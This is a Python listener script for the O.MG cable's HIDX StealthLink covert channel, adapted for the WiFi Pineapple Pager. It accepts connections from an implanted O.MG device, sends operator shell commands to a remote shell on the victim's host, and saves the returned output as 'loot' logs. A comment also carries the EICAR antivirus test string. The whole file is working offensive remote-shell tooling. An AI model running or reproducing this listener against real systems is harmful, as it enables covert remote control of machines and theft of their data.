# Stealthlink-client-pager.py:  an adapted version of stealthlink-client-universal.py for WiFi Pineapple Pager.
# Original code here: https://github.com/O-MG/O.MG-Firmware/blob/81fa7b228a70811174d5b4aaf609ef788cfa7fdc/tools/HIDX/python/stealthlink-client-universal.py

#Name: Stealth-client-universal.py
#Author: Wasabi (@spiceywasabi)
#Acknowledgments: Ø1(@01p8or13)
#Required Dependencies: Python3, Network connectivity to O.MG device

#Description:
"""
This Python-script acts as a listener for HIDX Stealthlink, mainly the PoCs provided under:
- https://github.com/O-MG/O.MG-Firmware/blob/stable/tools/HIDX/powershell/win-hidshell.ps1
- https://github.com/O-MG/O.MG-Firmware/blob/stable/tools/HIDX/python/stealthlink-host-universal.py

Configuration in lines 49 - 52
"""

# current issues:
""" 
- %quit not closing as intended. CTRL +C required  - fixed

-  input prompt may return before content is finished so you will see things like
$whoami
$root
if you want to fix this easily, just hit another enter as soon as you send a message

- the universal client + universal python target code are slower than native or powershell

- ascii characters are primarily *only* supported, other characters may be stripped

- recvlog doesn't buffer data for efficiency purposes, error checking should (and will) be added later
this will also fix #1

- this client is currently mac or linux only due to select()
"""

import os
import sys
import socket
import select
import logging
import binascii
import argparse
import threading

from datetime import datetime
from time import sleep
from pprint import pprint

# X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*

## These can be set but aren't meant to be changed regularly.
remote_prompt = True # Assume that prompt gets received from host - Set to true for Powershell usage
nowait = True # wait or not wait for end of message control characters 
delay = None # delay between messages (0.2-0.5 is fine) default to None
windows = False # enable larger buffer, ONLY meant for testing!

def non_blocking_input(prompt="", timeout=5):
    print(prompt, end='', flush=True)
    rlist, _, _ = select.select([sys.stdin], [], [], timeout)
    if rlist:
        return sys.stdin.readline().strip()
    else:
        return None

def pad_input(input_str, left_pad=False, right_pad=False, chunk_size = 8):
    if left_pad and right_pad:
        raise Exception("[!]Cannot add padding on both the left and right side!")
    # default to right pad
    if not left_pad and not right_pad:
        right_pad = True
    padding_length = (chunk_size - (len(input_str) % chunk_size)) % chunk_size
    padded_str = None
    if isinstance(input_str, bytes):
        input_str = input_str.decode("utf-8")
    if right_pad:
        padded_str = input_str + ' ' * padding_length    
    if left_pad:
        padded_str = ' ' * padding_length + input_str
    return padded_str

def split_output(message,chunk_size=8):
    chunks = []
    for i in range(0,len(message),chunk_size):
        raw_message = message[i:i+chunk_size]
        padded_message = pad_input(raw_message,right_pad=True)
        chunks.append(padded_message)
    return chunks
    
def recvlog(msg):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"{msg}",end="")
    logger_received.info(msg)
    logger_combined.info(f"[{timestamp}] [RECV] {msg}")

def handle_client(client_socket,run,rts):
    global nowait
    no_data_count = 0
    while run.is_set():
        data = None
        try:
            data = client_socket.recv(1024).decode()
        except OSError as e:
            run.clear()
            print(f"[!]Socket Exception: {e}")
            break
        # double check the data
        if not data:
            recvlog("[!]Socket has disconnected....")
            client_socket.shutdown(socket.SHUT_RDWR)
            client_socket.close()
            run.clear()
            break
        else:
            if "\x07\x17" in data or nowait:
                rts.set()
            elif "SH" in data:
                data = data.strip("\n")
                rts.set()
            elif data == "" and no_data_count>=2:
                rts.set()
            #print("Status: %s"%str(rts.is_set()))
            recvlog(f"{data}")
    
def console_input(client_socket,run,rts, server_socket = None):
    global nowait, windows, delay, remote_prompt
    print("\nHIDX StealthLink Universal Client (type '%quit' to exit)")    
    
    debug_send = False
    split_messages = True
    while run.is_set():
        if rts.is_set():
            prompt_msg = "\r$"
            user_input = ""
            if debug_send:
                dt = datetime.now().strftime("%M:%S.%f")
                user_input = f"CLI {dt}"
            else:
                if remote_prompt:
                    prompt_msg = ""
                print(prompt_msg, end='', flush=True)
                user_input = input()
                if not user_input:
                    continue
                if user_input == "%exit" or "%quit" in user_input:
                    if server_socket:
                        server_socket.settimeout(1)
                    #client_socket.shutdown()
                    client_socket.close()
                    run.clear()
                    break
            try:
                raw_input = user_input + "\n\x07\x17\00"
                if windows:
                    raw_input =pad_input(raw_input,right_pad=True,chunk_size=64)
                if logger_combined:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    logger_combined.info(f"[{timestamp}] [SEND] {raw_input}")
                output = None
                if split_messages:
                    output = split_output(raw_input)
                    for m in output:
                        client_socket.sendall(m.encode())
                        if delay:
                            sleep(float(delay))
                else:
                    output = raw_input.encode()
                    client_socket.sendall(output)
                if not nowait:
                    rts.clear()
            except OSError as e:
                print(f"[!]Socket Exception: {e}")
                run.clear()
                #client_socket.shutdown()
                client_socket.close()
                break

def hidxcli(host, port,reuse=True):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if reuse:
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    run = threading.Event()
    run.set()
    
    rts = threading.Event()
    rts.set()

    try:
        server_socket.bind((host, port))
        server_socket.listen(1)
        server_socket.settimeout(1) 
        print(f"[*]Server listening on {host}:{port}")
        while run.is_set():
            client_socket,addr = None,None
            try:
                client_socket, addr = server_socket.accept()
                recvlog(f"[+]O.MG Device connected from {addr[0]}:{addr[1]}")
                os.system(f"ALERT 'StealthLink: O.MG Device connected from {addr[0]}'")
                rts.set()
            except socket.timeout:
                pass
            if client_socket:
                client_thread = threading.Thread(target=handle_client, args=(client_socket,run,rts,))
                client_thread.start()
                console_thread = threading.Thread(target=console_input, args=(client_socket,run,rts,server_socket,))
                console_thread.start()
    finally:
        print("[?]Attempting to close..")
        os.system("ALERT 'Stealthlink: O.MG Device Disconnected and/or Listener shutting down'")
        try:
            server_socket.shutdown(socket.SHUT_RDWR)
        except:
            pass
        server_socket.close()
        exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Client")
    parser.add_argument("host", type=str, nargs="?", default="0.0.0.0", help="address to bind to")
    parser.add_argument("port", type=int, nargs="?", default=1234, help="port to listen on")
    parser.add_argument("sendlog", type=str, nargs="?", help="message send log")
    parser.add_argument("recvlog", type=str, nargs="?", help="message receive log (for loot)")
    args = parser.parse_args()
    
    # Create /root/loot directory if it doesn't exist
    loot_dir = "/root/loot/stealthlink"
    os.makedirs(loot_dir, exist_ok=True)
    
    # Generate timestamped log filenames for this session
    session_timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    default_recvlog = os.path.join(loot_dir, f"stealthlink-recv-{session_timestamp}.log")
    default_combinedlog = os.path.join(loot_dir, f"stealthlink-combined-{session_timestamp}.log")
    
    recvlog_path = args.recvlog if args.recvlog else default_recvlog
    combinedlog_path = args.sendlog if args.sendlog else default_combinedlog
    
    global logger_received, logger_combined
    
    # Create formatter that only outputs the message (we add our own timestamps)
    formatter = logging.Formatter('%(message)s')
    
    logger_received = logging.getLogger("received_data")
    recv_handler = logging.FileHandler(recvlog_path)
    recv_handler.setFormatter(formatter)
    logger_received.addHandler(recv_handler)
    logger_received.setLevel(logging.INFO)
    
    logger_combined = logging.getLogger("combined_data")
    combined_handler = logging.FileHandler(combinedlog_path)
    combined_handler.setFormatter(formatter)
    logger_combined.addHandler(combined_handler)
    logger_combined.setLevel(logging.INFO)
    
    print(f"[*] Logs will be saved to:")
    print(f"[*]   Received: {recvlog_path}")
    print(f"[*]   Combined: {combinedlog_path}")

    hidxcli(args.host, args.port)
